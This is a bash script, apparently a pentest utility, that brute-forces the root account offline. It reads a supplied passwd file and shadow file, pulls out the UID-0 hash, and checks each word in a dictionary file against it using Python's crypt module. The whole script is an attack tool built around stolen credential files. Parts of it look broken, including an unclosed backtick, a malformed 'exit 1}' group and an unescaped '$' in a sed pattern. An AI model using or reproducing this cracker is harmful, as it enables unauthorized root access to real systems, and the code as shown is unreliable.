#!/bin/bash

#Uses the Python Crypt library to brute for root account .
#It might be useful if you are not having access to your pentest toolset and python is installed.


ROOT_UID=0

[[ "$#" -eq 3 ]] || { echo "[*] Usage : `basename $0` <passwd_file> <shadow_file> <dict_file>" && exit;}

for rootname in `sed -ne 's|^\([a-zA-Z0-9.\/@_-][a-zA-Z0-9.\/@_-]*\):[x!]:'$ROOT_UID'.*|\1|p' <"$1"`; do
	echo
	echo "[*] Found root account with username : '$rootname' "
	echo "[*] Starting brute force .."

 	entry=`sed -ne 's|^'"$rootname"':\($[0-9]$[a-zA-Z0-9./][a-zA-Z0-9./]*$[a-zA-Z0-9./][a-zA-Z0-9./]*\):.*|\1|p' < "$2"`
	
	while IFS= read -r password || [ -n "$password" ] 
	do
		
		echo -n "[?] Trying password '"$password"' for account '"$rootname"' : "
		IFS='$' read -ra fields <<< `echo -n "$entry" 
		result=`python -c 'from crypt import crypt; print crypt( "'$password'"','"$'${fields[1]}'$'${fields[2]}'$")'`
		[[ ! "$?" -eq 0 ]] && { echo -ne "[!] Could not use python crypt .\n[*] Check if python and the crypt module are available. "; exit 1}
		[[ "$entry" = "$result" ]] && echo " SUCCESS!" && break || echo " FAILURE."
		
	done < "$3"
	echo
done

exit 0





